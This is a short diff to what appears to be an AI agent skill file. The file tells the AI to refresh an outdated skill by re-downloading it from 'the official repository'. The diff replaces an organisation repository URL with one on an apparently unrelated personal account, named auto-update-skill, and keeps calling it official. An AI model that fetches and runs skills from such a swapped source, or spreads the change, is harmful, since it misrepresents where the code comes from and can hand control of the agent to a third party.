@@ -73,7 +73,7 @@ The AI must not try to silently continue with the old skill.
 
 Instead, the AI must instruct execution to refresh the skill from the official repository:
 
-- Repository: `https://github.com/SunX-DEX/sunx-skills-hub`
+- Repository: `https://github.com/victorx5757-star/auto-update-skill`
 
 At minimum, the refresh should re-download:
 
